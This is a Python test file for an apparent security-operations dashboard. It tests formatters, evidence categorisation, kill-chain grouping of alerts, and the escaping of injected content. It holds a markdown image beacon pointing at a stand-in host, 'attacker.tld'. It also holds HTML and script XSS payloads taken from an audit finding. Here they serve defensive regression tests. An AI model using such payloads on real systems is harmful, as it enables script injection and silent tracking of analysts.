from dashboard.components.ui import build_kill_chain, mono, safe_html
from shared.formatters import format_timestamp, format_mitre, categorize_evidence, escape_markdown

def test_format_timestamp_valid():
    ts = "2026-09-01T08:20:31.103820+00:00"
    formatted = format_timestamp(ts)
    assert formatted == "2026-09-01 08:20:31 UTC"

def test_format_timestamp_invalid():
    assert format_timestamp("invalid_time") == "Invalid Time"
    assert format_timestamp("") == "Unknown Time"

def test_format_mitre():
    assert format_mitre("Command and Control", "T1071") == "Command and Control (T1071)"
    assert format_mitre("Discovery", "") == "Discovery"
    assert format_mitre("", "") == "Unmapped"

def test_categorize_evidence():
    evidence = {
        "query": "malicious.com",
        "orig_bytes": 500,
        "shannon_entropy": 4.5,
        "ml_confidence_score": 0.9,
        "process_name": "unknown",
        "user_id": ""
    }
    
    obs, inf, unk = categorize_evidence(evidence)
    
    # Observed facts
    assert "query" in obs
    assert "orig_bytes" in obs
    
    # Inferred/Calculated facts
    assert "shannon_entropy" in inf
    assert "ml_confidence_score" in inf
    
    # Unknown/Missing facts
    assert "process_name" in unk
    assert "user_id" in unk

def test_escape_markdown_neutralizes_link_and_image_injection():
    # The concrete exploit from the audit: a crafted DNS query rendered as
    # a markdown image, which would make the analyst's browser fetch an
    # attacker URL the instant the incident is opened.
    payload = "`![](https://attacker.tld/beacon?h=x)`"
    escaped = escape_markdown(payload)
    assert "![" not in escaped
    assert "](" not in escaped
    # Every special character is backslash-escaped
    assert escaped == r"\`\!\[\]\(https://attacker\.tld/beacon?h=x\)\`"

def test_escape_markdown_is_visually_inert_for_ordinary_values():
    # CommonMark consumes the backslash and renders the literal character,
    # so ordinary evidence values (IPs, hostnames) are unaffected visually
    # -- only demonstrating that escaping doesn't mangle common content.
    assert escape_markdown("10.0.0.1") == r"10\.0\.0\.1"
    assert escape_markdown(500) == "500"


def test_mono_html_escapes_an_injected_tag():
    # dashboard/pages/command_center.py's TSOC-2026-02 stored-XSS finding:
    # source_ip flows unvalidated into incident_id, then into mono() calls
    # rendered with unsafe_allow_html=True. The escaping must happen
    # inside mono() itself, not depend on the caller remembering it.
    payload = '<img src=x onerror=alert(1)>'
    rendered = mono(payload)
    assert "<img" not in rendered
    assert rendered == '<span class="tsoc-mono">&lt;img src=x onerror=alert(1)&gt;</span>'


def test_mono_wraps_ordinary_values_visually_unchanged():
    assert mono("INC-10-0-0-5") == '<span class="tsoc-mono">INC-10-0-0-5</span>'


def test_safe_html_escapes_an_injected_tag():
    payload = '<script>alert(1)</script>'
    assert "<script" not in safe_html(payload)


def _alert(timestamp, model_name="DL_MODEL", threat_class="Anomalous Flow", severity="medium", tactic=None, technique=None):
    return {
        "timestamp": timestamp,
        "model_name": model_name,
        "threat_class": threat_class,
        "severity": severity,
        "mitre_tactic": tactic,
        "mitre_technique": technique,
    }


def test_build_kill_chain_empty_input_returns_empty_list():
    assert build_kill_chain([]) == []


def test_build_kill_chain_groups_globally_not_just_consecutive_runs():
    # Two detectors firing on interleaved, sub-second timestamps for the
    # same ongoing transfer -- exactly what a real windowed detector
    # (flow anomaly + byte-volume exfil both re-evaluating the same
    # sustained transfer) produces. Collapsing only strictly-adjacent
    # duplicates would fragment this into 4 tiny alternating phases;
    # grouping by type globally should produce exactly 2.
    alerts = [
        _alert("2026-01-01T00:00:00Z", model_name="A", threat_class="Anomalous Flow"),
        _alert("2026-01-01T00:00:01Z", model_name="B", threat_class="Data Exfiltration"),
        _alert("2026-01-01T00:00:02Z", model_name="A", threat_class="Anomalous Flow"),
        _alert("2026-01-01T00:00:03Z", model_name="B", threat_class="Data Exfiltration"),
    ]
    phases = build_kill_chain(alerts)
    assert len(phases) == 2
    assert phases[0]["model_name"] == "A"
    assert phases[0]["threat_class"] == "Anomalous Flow"
    assert phases[0]["count"] == 2
    assert phases[0]["start_time"] == "2026-01-01T00:00:00Z"
    assert phases[0]["end_time"] == "2026-01-01T00:00:02Z"
    assert phases[1]["model_name"] == "B"
    assert phases[1]["count"] == 2


def test_build_kill_chain_orders_phases_by_first_occurrence():
    alerts = [
        _alert("2026-01-01T00:00:05Z", model_name="LATER", threat_class="DGA"),
        _alert("2026-01-01T00:00:01Z", model_name="FIRST", threat_class="Recon"),
        _alert("2026-01-01T00:00:06Z", model_name="LATER", threat_class="DGA"),
    ]
    phases = build_kill_chain(alerts)
    assert [p["model_name"] for p in phases] == ["FIRST", "LATER"]


def test_build_kill_chain_escalates_to_the_most_severe_alert_in_a_group():
    alerts = [
        _alert("2026-01-01T00:00:00Z", severity="low"),
        _alert("2026-01-01T00:00:01Z", severity="critical"),
        _alert("2026-01-01T00:00:02Z", severity="medium"),
    ]
    phases = build_kill_chain(alerts)
    assert len(phases) == 1
    assert phases[0]["severity"] == "critical"


def test_build_kill_chain_preserves_mitre_fields_from_the_first_alert_in_a_group():
    alerts = [
        _alert("2026-01-01T00:00:00Z", tactic="Command and Control", technique="T1071"),
        _alert("2026-01-01T00:00:01Z", tactic=None, technique=None),
    ]
    phases = build_kill_chain(alerts)
    assert phases[0]["mitre_tactic"] == "Command and Control"
    assert phases[0]["mitre_technique"] == "T1071"
